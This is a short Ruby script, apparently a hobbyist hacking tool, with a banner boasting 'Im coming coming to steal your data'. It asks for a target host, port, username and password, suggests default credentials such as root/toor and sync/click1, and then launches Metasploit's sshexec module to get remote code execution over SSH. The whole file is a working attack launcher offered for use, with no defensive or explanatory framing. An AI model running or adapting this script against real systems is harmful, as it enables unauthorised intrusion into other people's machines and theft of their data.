puts """

 	  Th3 M4d_Sc13nT15t is here to stay...
         Im coming coming to steal your data...

            SSH User Code Execution

	           	Linux x86

       		 Starting Port:: 22   

"""

puts " [?] What is the target? "
print "[!] ---> "

target = gets.chomp

puts " [?] What is the Port ? [Start with 22]  "
print "[!] ---> "

port = gets.chomp

puts " [?] What is the Username? [sync] or maybe [root, toor] "
print "[!] ---> "

name = gets.chomp

puts " [?] What is the Password? [click1] or maybe [root, toor] "
print "[!] ---> "

pass = gets.chomp

exec("msfconsole -x 'use exploit/multi/ssh/sshexec' -x 'setg RHOST #{target}' -x 'setg RPORT #{port}' -x 'set USER #{name}' -x 'set PASS #{pass}' -x 'run' 'run'")
